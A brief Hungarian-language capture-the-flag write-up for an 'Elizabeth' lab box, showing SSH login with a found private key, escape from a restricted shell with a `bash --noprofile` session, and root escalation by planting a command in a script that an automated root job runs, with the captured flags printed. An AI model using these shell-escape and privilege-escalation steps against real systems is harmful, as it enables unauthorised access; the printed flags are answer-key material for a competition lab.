# Elizabeth local

Keresd meg Bettit is 10.10.(1-9).11:222

---

https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html

egy tok masik gepen talahato id_rsa-val kell belepni apollo neven (az ottani user neve)

```
ssh -i id_rsa apollo@10.10.1.11 -p 222
```
egy restricted shellbe jutunk, de megsejthetjuk hogy mit kell csinalni:
```
echo "$(<flag.txt)"
```

ez sokkal faszabb:
```
ssh -i id_rsa apollo@10.10.1.11 -p 222 -t "bash --noprofile"
apollo@d034e0a450d4:/srv/proftp$ cat /home/apollo/flag.txt
{HCSC}-31Lizab3tH-L0;C4l_Fl@g
```

root:
```
apollo@d034e0a450d4:/srv/proftp$ ls
Note_for_Apollo.txt
apollo@d034e0a450d4:/srv/proftp$ cat Note_for_Apollo.txt
Apollo darling,
I couldn't setup proper access for you yet.
IT won't allow you to have root access because of some technical/management issues. However i quickly came up with a solution
that allows you to run root commands. Just copy the commands here and my automated script will execute it.
~XoXo : Liz
P.S.: bring milk on your way home
apollo@d034e0a450d4:/srv/proftp$ echo 'cat /root/flag.txt >> /tmp/x.x' > x.sh
apollo@d034e0a450d4:/srv/proftp$ cat /tmp/x.x
{HCSC}-Eliz4b3tH-_R0otFl4G!
apollo@d034e0a450d4:/srv/proftp$ echo 'echo '' > /tmp/x.x' > x.sh
